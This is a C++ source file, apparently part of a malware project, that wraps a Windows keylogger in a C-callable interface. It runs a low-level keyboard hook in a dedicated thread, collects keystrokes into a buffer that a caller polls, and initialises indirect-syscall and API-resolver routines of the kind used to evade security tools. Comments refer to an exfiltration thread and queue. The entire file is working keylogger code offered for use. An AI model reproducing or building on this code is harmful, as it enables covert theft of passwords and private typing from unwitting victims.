/*
 * keylogger_wrap.cpp — C-callable wrapper around Keylogger.h
 *
 * Runs the LL hook in a dedicated thread (LL hooks need a message pump
 * on the installing thread). Drains keystrokes into a UTF-8 circular
 * buffer via callback; caller polls with keylogger_get().
 */

#include <windows.h>
#include <string>
#include <cstring>
#include "../keylogger/Keylogger.h"

#define KL_BUF_SZ (128 * 1024)

static CRITICAL_SECTION g_kcs;
static char             g_kbuf[KL_BUF_SZ];
static size_t           g_kpos    = 0;
static volatile LONG    g_kinit   = 0;
static HANDLE           g_kthread = NULL;
static DWORD            g_ktid    = 0;

static void _kl_cb(const std::wstring &ws)
{
    if (ws.empty()) return;
    int n = WideCharToMultiByte(CP_UTF8, 0, ws.c_str(), (int)ws.size(),
                                NULL, 0, NULL, NULL);
    if (n <= 0) return;
    char *tmp = new (std::nothrow) char[n + 1];
    if (!tmp) return;
    WideCharToMultiByte(CP_UTF8, 0, ws.c_str(), (int)ws.size(),
                        tmp, n, NULL, NULL);
    tmp[n] = '\0';

    EnterCriticalSection(&g_kcs);
    size_t avail = KL_BUF_SZ - g_kpos - 1;
    size_t copy  = (size_t)n < avail ? (size_t)n : avail;
    memcpy(g_kbuf + g_kpos, tmp, copy);
    g_kpos += copy;
    g_kbuf[g_kpos] = '\0';
    LeaveCriticalSection(&g_kcs);
    delete[] tmp;
}

static DWORD WINAPI _kl_thread_fn(LPVOID)
{
    APIResolver::Initialize();
    IndirectSyscalls::Initialize();
    if (!Keylogger::Start(_kl_cb, false))
        return 1;
    MSG msg;
    while (GetMessageA(&msg, NULL, 0, 0) > 0) {
        TranslateMessage(&msg);
        DispatchMessageA(&msg);
    }
    return 0;
}

extern "C" {

void keylogger_start(void)
{
    if (InterlockedCompareExchange(&g_kinit, 1, 0) != 0) return;
    InitializeCriticalSection(&g_kcs);
    g_kbuf[0] = '\0';
    g_kthread = CreateThread(NULL, 0, _kl_thread_fn, NULL, 0, &g_ktid);
}

void keylogger_stop(void)
{
    Keylogger::Stop();
    if (g_ktid)    PostThreadMessageA(g_ktid, WM_QUIT, 0, 0);
    if (g_kthread) {
        WaitForSingleObject(g_kthread, 5000);
        CloseHandle(g_kthread);
        g_kthread = NULL;
    }
    g_ktid = 0;
}

int keylogger_get(char *buf, size_t bufsz)
{
    if (!buf || bufsz < 2) return 0;

    /* Drain g_keyBuffer + g_exfilQueue atomically — bypasses ExfilThread
     * timing: whatever hasn't reached g_kbuf yet is grabbed directly. */
    std::wstring all = Keylogger::FlushAll();
    if (!all.empty()) _kl_cb(all);

    /* Brief wait so ExfilThread finishes any entry it already popped but
     * hasn't pushed to g_kbuf yet (tight race window). */
    Sleep(30);

    EnterCriticalSection(&g_kcs);
    if (g_kpos == 0) {
        LeaveCriticalSection(&g_kcs);
        buf[0] = '\0';
        return 0;
    }
    size_t copy = g_kpos < bufsz - 1 ? g_kpos : bufsz - 1;
    memcpy(buf, g_kbuf, copy);
    buf[copy] = '\0';
    memmove(g_kbuf, g_kbuf + copy, g_kpos - copy + 1);
    g_kpos -= copy;
    LeaveCriticalSection(&g_kcs);
    return (int)copy;
}

int keylogger_is_active(void)
{
    return Keylogger::IsActive() ? 1 : 0;
}

} /* extern "C" */
